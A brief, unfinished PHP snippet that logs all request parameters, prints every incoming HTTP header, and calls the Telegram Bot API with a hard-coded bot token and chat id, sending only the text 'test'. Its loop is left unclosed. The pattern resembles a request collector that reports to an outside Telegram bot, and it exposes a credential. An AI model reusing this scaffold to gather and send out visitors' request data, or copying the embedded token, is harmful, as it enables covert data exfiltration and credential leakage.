<?php
   error_log(implode("|",$_REQUEST));
   foreach (getallheaders() as $name => $value) {
    echo "$name: $value\n";
      $curl = curl_init('https://api.telegram.org/bot937782324:AAFxgtrxcMuHlMMMK0JmT8H8-RnqTwsz7JY/sendMessage?chat_id=-261885730&text=test');
      curl_exec($curl);
?>

<script>
   
</script>
